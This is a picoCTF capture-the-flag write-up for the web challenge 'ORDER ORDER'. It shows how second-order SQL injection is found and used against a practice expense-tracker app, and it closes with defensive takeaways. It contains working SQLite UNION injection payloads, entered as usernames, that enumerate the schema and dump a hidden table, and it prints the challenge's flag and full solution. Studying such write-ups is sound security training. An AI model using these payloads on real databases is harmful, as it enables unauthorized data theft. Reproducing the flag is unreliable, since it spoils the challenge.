# PicoCTF – ORDER ORDER
**Category:** Web Exploitation  
**Difficulty:** Hard  
**Points:** 300  
**Author:** Darkraicg492  
**Flag:** `picoCTF{s3c0nd_0rd3r_1t_1s_3ad6ac82}`

---

## Description

> Can you try to get the flag from our website. I've prepared my queries everywhere! I think!

---

## Hints

1. What does order in SQL Injection mean?

---

## Recon

### Step 1 – Application Overview

The app is an expense tracker with:
- Login / Signup
- Add expenses (Description, Amount, Date)
- Inbox showing report generation results
- Download generated CSV reports

### Step 2 – Finding the Injection Point

Registering with a single quote `'` as the username and generating a report revealed:

```
Report generation failed. Cause unrecognized token: "X' ORDER BY date'"
```

This confirms **Second Order SQL Injection** — the username is:
1. Safely stored in the DB during registration
2. Later retrieved and **unsafely embedded** into a SQL query during report generation

The query structure is approximately:

```sql
SELECT description, amount, date FROM expenses 
WHERE user_id = (SELECT id FROM users WHERE username = 'USERNAME') 
ORDER BY date
```

---

## Exploitation

### Step 3 – Enumerate Tables

Registered with username:

```
a' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'-- -
```

Generated report revealed tables:

```
aDNyM19uMF9mMTRn   ← suspicious base64-looking name
expenses
inbox
reports
sqlite_sequence
users
```

Decoding `aDNyM19uMF9mMTRn`:

```bash
echo "aDNyM19uMF9mMTRn" | base64 -d
# h3r3_n0_f14g  ← troll name, but the table is real!
```

### Step 4 – Dump Full sqlite_master

```
a' UNION SELECT sql,2,3 FROM sqlite_master-- -
```

Revealed the schema of `aDNyM19uMF9mMTRn`:

```sql
CREATE TABLE aDNyM19uMF9mMTRn (
    name TEXT PRIMARY KEY,
    value TEXT NOT NULL
)
```

A key-value store — this is where the flag lives!

### Step 5 – Dump the Flag Table

```
a' UNION SELECT name||':'||value,2,3 FROM aDNyM19uMF9mMTRn-- -
```

CSV output:

```
flag:picoCTF{s3c0nd_0rd3r_1t_1s_3ad6ac82}
```

---

## Flag

```
picoCTF{s3c0nd_0rd3r_1t_1s_3ad6ac82}
```

---

## Key Takeaways

- **Second Order SQL Injection** — input is safely stored initially, but later retrieved and used unsafely in another query. Parameterized queries must be used *everywhere*, not just at input time
- The challenge name "ORDER ORDER" referred to second-order injection, not ORDER BY injection
- Always enumerate ALL tables from `sqlite_master` and investigate suspicious ones — the flag was in `aDNyM19uMF9mMTRn` from the very first dump
- Base64-looking table names are worth decoding, but don't assume the name tells you the content
- In SQLite, use `sqlite_master` instead of `information_schema` for schema enumeration
